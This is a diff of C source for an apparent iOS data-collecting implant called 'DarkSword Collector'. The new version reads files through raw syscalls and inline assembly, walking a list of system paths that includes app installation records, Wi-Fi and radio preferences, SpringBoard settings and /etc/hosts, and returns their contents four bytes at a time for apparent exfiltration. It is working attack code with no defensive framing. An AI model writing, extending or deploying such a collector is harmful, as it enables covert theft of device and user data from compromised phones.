@@ -1,6 +1,5 @@
 /**
- * DarkSword Collector v43 - Diagnostic: read /etc/hosts (known good) + Telegram plist
- * Single file, plain C static volatile, same as v30
+ * DarkSword Collector v44 - Find readable system files & container data
  */
 
 static long _svc1(long n, long a) {
@@ -27,22 +26,56 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SEEK_SET 0
 #define O_RDONLY 0
 
-static volatile int g_offset = 0;
+#define NUM_FILES 8
+#define CHUNKS_PER_FILE 5
+
+static volatile int g_ctx = 0;
+
+static const char *get_path(int id) {
+    switch (id) {
+        case 0: return "/var/mobile/Library/com.apple.mobile.installation.plist";
+        case 1: return "/var/mobile/Library/com.apple.lsd.appinstallation.plist";
+        case 2: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
+        case 3: return "/var/mobile/Library/Preferences/com.apple.UIKit.plist";
+        case 4: return "/var/mobile/Library/Preferences/com.apple.mobilewifi.plist";
+        case 5: return "/var/mobile/Library/Preferences/com.apple.radios.plist";
+        case 6: return "/var/mobile/Library/Preferences/com.apple.springboard.plist";
+        case 7: return "/etc/hosts";
+        default: return (void*)0;
+    }
+}
 
 int ds_start(void) {
-    int offset = g_offset;
+    int ctx;
+    __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
+    int fid = (ctx >> 16) & 0xFF;
+    int chk = ctx & 0xFF;
 
-    /* Read /etc/hosts - known to work */
-    int fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
-    if (fd < 0) { g_offset = 0; return 0xDEAD0000; }
+    if (fid >= NUM_FILES) {
+        __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
+        return 0xFFFFFFFF;
+    }
+    if (chk >= CHUNKS_PER_FILE) {
+        int nc = ((fid + 1) << 16);
+        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
+        return 0xFF000000 | fid;
+    }
 
-    if (offset > 0) _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
+    const char *path = get_path(fid);
+    if (!path) { int nc = (fid + 1) << 16; __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx)); return 0xFD000000 | fid; }
+
+    int fd = (int)_svc2(SYS_open, (long)path, O_RDONLY);
+    if (fd < 0) { int nc = (fid + 1) << 16; __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx)); return 0xFE000000 | fid; }
+
+    int off = chk * 4;
+    _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
     unsigned char buf[4] = {0};
     int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
     _svc1(SYS_close, fd);
 
-    if (n < 1) { g_offset = 0; return 0xBEEF0000; }
+    int nc = (fid << 16) | (chk + 1);
+    __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
 
-    g_offset = offset + n;
+    if (n < 1) return 0xEE000000 | fid;
     return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
 }
